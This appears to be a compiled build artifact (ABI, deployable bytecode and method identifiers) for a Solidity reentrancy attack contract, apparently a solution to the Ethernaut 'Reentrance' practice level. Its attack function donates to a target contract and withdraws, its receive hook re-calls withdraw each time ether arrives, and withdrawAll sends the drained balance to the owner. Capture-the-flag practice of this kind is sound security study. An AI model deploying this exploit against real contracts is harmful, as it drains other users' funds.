{"abi":[{"type":"constructor","inputs":[{"name":"_reentranceAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[{"name":"_amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"reentranceContract","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IReentrance"}],"stateMutability":"view"},{"type":"function","name":"withdrawAll","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516103c63803806103c68339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b031992831617905560018054909116331790556103598061006d6000396000f3fe60806040526004361061005e5760003560e01c806364dd891a1161004357806364dd891a14610121578063853828b6146101405780638da5cb5b14610155576100c4565b806312065fe0146100c95780634959aca2146100f0576100c4565b366100c4576000805460408051632e1a7d4d60e01b815234600482015290516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b1580156100aa57600080fd5b505af11580156100be573d6000803e3d6000fd5b50505050005b600080fd5b3480156100d557600080fd5b506100de61016a565b60408051918252519081900360200190f35b3480156100fc57600080fd5b5061010561016e565b604080516001600160a01b039092168252519081900360200190f35b61013e6004803603602081101561013757600080fd5b503561017d565b005b34801561014c57600080fd5b5061013e61025c565b34801561016157600080fd5b50610105610314565b4790565b6000546001600160a01b031681565b60008054604080517e362a9500000000000000000000000000000000000000000000000000000000815230600482015290516001600160a01b039092169262362a95928592602480820193929182900301818588803b1580156101df57600080fd5b505af11580156101f3573d6000803e3d6000fd5b50506000805460408051632e1a7d4d60e01b81526004810188905290516001600160a01b039092169550632e1a7d4d9450602480820194509082900301818387803b15801561024157600080fd5b505af1158015610255573d6000803e3d6000fd5b5050505050565b6001546001600160a01b031633146102d557604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600960248201527f4e6f74206f776e65720000000000000000000000000000000000000000000000604482015290519081900360640190fd5b6001546040516001600160a01b039091169081904780156108fc02916000818181858888f19350505050158015610310573d6000803e3d6000fd5b5050565b6001546001600160a01b03168156fea2646970667358221220e0692c2eff21fe34b04bebba20a3dc6868517567a3fa135d6f3ea1e0a606766264736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"attack(uint256)":"64dd891a","getBalance()":"12065fe0","owner()":"8da5cb5b","reentranceContract()":"4959aca2","withdrawAll()":"853828b6"},"id":0}